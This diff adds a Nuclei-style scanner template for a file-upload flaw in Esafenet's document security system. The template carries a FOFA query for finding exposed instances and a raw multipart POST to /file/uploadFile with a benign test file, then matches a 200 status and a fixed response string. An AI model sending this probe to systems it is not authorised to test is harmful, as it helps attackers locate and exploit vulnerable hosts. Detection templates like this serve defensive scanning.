@@ -1,0 +1,31 @@
+id: esafenet-upload-file-uploadfile
+info:
+  name: 亿赛通电子文档安全管理系统 uploadFile 文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件上传
+  metadata:
+    finger: 亿赛通电子文档安全管理系统
+    fofa: app="亿赛通-电子文档安全管理系统"
+
+http:
+  - raw:
+      - |
+        POST /file/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=0ac445a70ef9526aeb69efb4569810d6
+
+        --0ac445a70ef9526aeb69efb4569810d6
+        Content-Disposition: form-data; name="file"; filename="file"
+
+        123
+        --0ac445a70ef9526aeb69efb4569810d6--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "CBDJCOKKKDJALCHGLOICCHCGLHNPDANBDGPPNLNLHMHLAAAGALIIHCBFPKNFHKOFEIOKAOMHAMHLILNEHEPEMGFFHOPCEPFAMCEABDCDMAPIAHABHKLFPIFPHDJNINCBAGFOCNMAGAHODIJIFAFDOCAOHNOPINMJMCMFPLADFBMMNGIDCECKKBPIJLDEJAICBAMCHOJDKPAAHJMDLFLMJOOFLBJHBBOJIODPGPKELCFCCLFJJOFCHDNPBPGDGPIO"
